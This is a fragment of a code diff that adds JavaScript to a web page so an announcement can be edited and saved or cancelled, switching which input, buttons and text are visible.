+      announcementTextDiv.innerText = newAnn;
+    }
+    // Hide input and buttons, show text
+    announcementInput.style.display = 'none';
+    announcementButtons.style.display = 'none';
+    announcementTextDiv.style.display = 'block';
+  });
+
+  // Cancel editing
+  document.getElementById('cancelBtn').addEventListener('click', () => {
+    announcementInput.style.display = 'none';
+    announcementButtons.style.display = 'none';
+    announcementTextDiv.style.display = 'block';
+  });
+</script>
+
 </body>
 </html>
